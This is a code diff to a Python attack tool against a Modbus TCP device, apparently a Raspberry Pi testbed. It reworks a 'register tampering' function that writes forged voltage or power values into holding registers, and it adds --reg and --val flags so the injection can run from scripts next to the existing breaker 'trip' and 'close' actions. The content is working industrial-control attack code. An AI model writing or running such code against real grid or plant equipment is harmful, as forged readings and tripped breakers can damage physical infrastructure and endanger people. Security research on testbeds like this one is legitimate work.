@@ -159,23 +159,30 @@ def run_close_breaker(client):
         print("[-] Close command failed.")
 
 
-def run_register_injection(client):
-    print("\n--- Modbus Register Tampering Configuration ---")
-    try:
-        reg_num = int(input("  Register to overwrite [40001=Voltage, 40003=Power]: ").strip() or "40001")
-        if reg_num == 40001:
-            val_input = float(input("  Forged Voltage value in Volts [280.0]: ").strip() or "280.0")
-            raw_val = int(val_input * 10) if val_input < 1000 else int(val_input)
-            reg_addr = 0
-        elif reg_num == 40003:
-            raw_val = int(input("  Forged Power value in Watts [5000]: ").strip() or "5000")
-            reg_addr = 2
-        else:
-            reg_addr = reg_num - 40001
-            raw_val = int(input("  Raw 16-bit unsigned value to write: ").strip())
-    except (ValueError, EOFError):
-        print("[-] Invalid input. Aborted.")
-        return
+def run_register_injection(client, reg_num: int = None, val_input: float = None):
+    if reg_num is None:
+        print("\n--- Modbus Register Tampering Configuration ---")
+        try:
+            reg_num = int(input("  Register to overwrite [40001=Voltage, 40003=Power]: ").strip() or "40001")
+            if reg_num == 40001:
+                val_input = float(input("  Forged Voltage value in Volts [280.0]: ").strip() or "280.0")
+            elif reg_num == 40003:
+                val_input = float(input("  Forged Power value in Watts [5000]: ").strip() or "5000")
+            else:
+                val_input = float(input("  Raw 16-bit unsigned value to write: ").strip())
+        except (ValueError, EOFError):
+            print("[-] Invalid input. Aborted.")
+            return
+
+    if reg_num == 40001:
+        raw_val = int(val_input * 10) if val_input < 1000 else int(val_input)
+        reg_addr = 0
+    elif reg_num == 40003:
+        raw_val = int(val_input)
+        reg_addr = 2
+    else:
+        reg_addr = reg_num - 40001
+        raw_val = int(val_input)
 
     print(f"[!] Overwriting Register {40001 + reg_addr} with value {raw_val}...")
     success = client.write_single_register(reg_addr=reg_addr, value=raw_val)
@@ -191,6 +198,8 @@ def main():
     parser.add_argument('--target', default='10.175.107.30', help="Target Raspberry Pi IP")
     parser.add_argument('--port', type=int, default=5020, help="Modbus TCP Port (default: 5020)")
     parser.add_argument('--action', choices=['recon', 'trip', 'close', 'inject', 'menu'], default='menu', help="Action to execute")
+    parser.add_argument('--reg', type=int, default=None, help="Register number for inject (e.g. 40001)")
+    parser.add_argument('--val', type=float, default=None, help="Value for inject (e.g. 280.0)")
     args = parser.parse_args()
 
     client = ModbusClient(host=args.target, port=args.port)
@@ -209,7 +218,7 @@ def main():
         elif args.action == 'close':
             run_close_breaker(client)
         elif args.action == 'inject':
-            run_register_injection(client)
+            run_register_injection(client, reg_num=args.reg, val_input=args.val)
         else:
             while True:
                 print(f"""
